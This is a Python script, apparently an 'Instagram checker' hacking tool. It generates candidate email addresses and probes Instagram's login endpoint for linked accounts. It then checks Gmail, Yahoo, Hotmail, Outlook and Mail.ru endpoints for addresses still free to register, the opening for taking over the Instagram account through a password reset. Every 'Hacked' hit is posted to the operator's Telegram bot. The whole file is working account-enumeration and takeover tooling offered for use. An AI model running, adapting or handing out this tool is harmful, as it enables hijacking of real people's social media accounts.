import requests,os,mechanize,random,json
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
B = '\033[1;34m'
W = '\033[1;35m'
F = '\033[1;36m'
user='1234567890'
def code_whisper_mailru(self,ty,urw,mod):
 headers_6 = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
 url = 'https://account.mail.ru/api/v1/user/exists'
 data_6 = {'email': self.email}
 js = requests.post(url, data=data_6, headers=headers_6)
 if str(js.json()['body']['exists']) == 'False':
     mra = f"""
{ty}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {self.email}
 .📬. Site : {urw}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
Tele ==> @ppn10
        """
     print(f"{G} Hacked {mod} and Mail.ru ==> "+G+self.email)
     tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
     print(G+mra)
 else:
     print(S+" Not Hacked Mail.ru => "+self.email)
def code_whisper_hotmail(self,ty,urw,mod):
 url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + self.email + "&_=1604288577990"
 data = ''
 headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}	
 html = requests.get(url, data=data, headers=headers).text
 if 'Neither' in html:
     mra = f"""
{ty}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {self.email}
 .📬. Site : {urw}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
Tele ==> @ppn10
        """
     print(f"{G} Hacked {mod} and HotMail ==> "+G+self.email)
     tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
     print(G+mra)
 else:
     print(S+" Not Hacked HotMail => "+self.email)
def code_whisper_outlook(self,ty,urw,mod):
 url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + self.email + "&_=1604288577990"
 data = ''
 headers = {
		"Accept": "*/*",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		"Connection": "close",
		"Host": "odc.officeapps.live.com",
		"Accept-Encoding": "gzip, deflate",
		"Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		"Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		"canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		"uaid": "d06e1498e7ed4def9078bd46883f187b",
		"Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}	
 html = requests.get(url, data=data, headers=headers).text
 if 'Neither' in html:
     mra = f"""
{ty}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {self.email}
 .📬. Site : {urw}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
Tele ==> @ppn10
        """
     print(f"{G} Hacked {mod} and OutLook ==> "+G+self.email)
     tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
     print(G+mra)
 else:
     print(S+" Not Hacked OutLook => "+self.email)
def code_whisper_yahoo(self,ty,urw,mod):
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozila')]
    login = 'https://login.yahoo.com/?display=narrow&.intl=xa&.lang=ar-JO&.src=fpctx&done=https%3A%2F%2Fmaktoob.yahoo.com%2F&prefill=0&chllngnm=base'
    br.open(login)
    br.select_form(nr=0)
    br.form['username'] = self.email
    sub = br.submit()
    urlY = sub.geturl()
    if urlY == login:
        mra = f"""
{ty}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {self.email}
 .📬. Site : {urw}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
Tele ==> @ppn10
        """
        print(f"{G} Hacked {mod} and yahoo ==> "+G+self.email)
        tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
        print(G+mra)
        pass
    else:
        print(S+" Not Hacked yahoo => "+self.email)
        
def code_whisper_gmail(self,ty,urw,mod):
	url = 'https://android.clients.google.com/setup/checkavail'
	h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	d = json.dumps({
		'username':self.email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
	res = requests.post(url,data=d,headers=h)
	if res.json()['status'] == 'SUCCESS':
	    mra = f"""
{ty}
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. 
 .✉. 𝐞𝐦𝐚𝐢𝐥 : {self.email}
 .📬. Site : {urw}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
Tele ==> @ppn10
        """
	    print(f"{G} Hacked {mod} and Gmail ==> "+G+self.email)
	    tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= \n {mra}')
	    print(G+mra)
        #pass
	if res.json()['status'] == 'USERNAME_UNAVAILABLE':
	    print (S+' Not Hacked Gmail ==> '+self.email)
class ChecK():
#  while True:
    def __init__(self):
      i=0
      while True:
#        self.email = str(input("Enter Email: "))
#        name=input('[+] Give Me Name To Hack ==> ')
        whisper = str("".join(random.choice(user)for i in range(rng)))
        self.email = (name+whisper+BTS)
        if '1001' in self.email:
        	exit()
        self.instagram()
    def PrintTI(self):
        print(f"{G}InstaGram = {self.email} = Linked")
    def PrintFI(self):
        print(f"{E}InstaGram = {self.email} = Unlinked")
    def instagram(self):
        mod='InstaGram'
        ty='.📷. InstaGram .📷.'
        urw='https://www.instagram.com/accounts/password/reset/'
        import time,requests
        url = 'https://www.instagram.com/accounts/login/ajax/'
        heade = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en,ar;q=0.9,en-US;q=0.8,vi;q=0.7',
'content-length': '313',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'missing',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Microsoft Edge";v="92"',
'sec-ch-ua-mobile': '?0',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84',
'x-asbd-id': '198387',
'x-csrftoken': 'HpoO4isqbCMK5a6fl9CRofLsuxpwGavJ',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR2_82ibn8D_4DzDUg2jml85Kj9ruPEQVg0mDDRCksQ3pOav',
'x-instagram-ajax': 'd26a8ffbcd2b',
'x-requested-with': 'XMLHttpRequest',
}
        tim = str(time.time()).split('.')[1]
        data = {
'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:diwddeoded',
'username': self.email,
'queryParams': '{}',
'optIntoOneTap': 'false',
'trustedDeviceRecords': '{}',
}
        ree = requests.post(url, headers=heade, data=data).text
        if '"user":true,"' in ree:
            self.PrintTI()
            if BTS == '@gmail.com':
                code_whisper_gmail(self,ty,urw,mod)
            if BTS == '@yahoo.com':
                code_whisper_yahoo(self,ty,urw,mod)
            if BTS == '@hotmail.com':
                code_whisper_hotmail(self,ty,urw,mod)
            if BTS == '@outlook.com':
                code_whisper_outlook(self,ty,urw,mod)
            if BTS == '@mail.ru':
                code_whisper_mailru(self,ty,urw,mod)
        else:
            self.PrintFI()
if __name__ == "__main__":
    os.system('clear')
    print(B+"""

           [-] Whisper Instagram Checker [-]
     [ Gmail - HotMail - OutLook - Yahoo - Mailru]
        ======================================= 
        | [+] Programming By : Whisper        |
        | [+] Telegram : @ppn10          |
        | [+] Github : Whisper-666            |
        =======================================

        """)
    
    ID=input(f'{B}[+] TeleGram ID ==>{S} ')
    tok=input(f'{B}[+] TeleGram BOT Token ==>{G} ')
    BTS=input(f'{B}[+] E-mail Domain ==>{F} ')
    name=input(f'{B}[+] Give Me Name To Hack ==>{E} ')
    rng=input(f'{B}[+] How Many Numbers After Name ? ==>{W} ')
    rng=int(rng)
    ChecK()
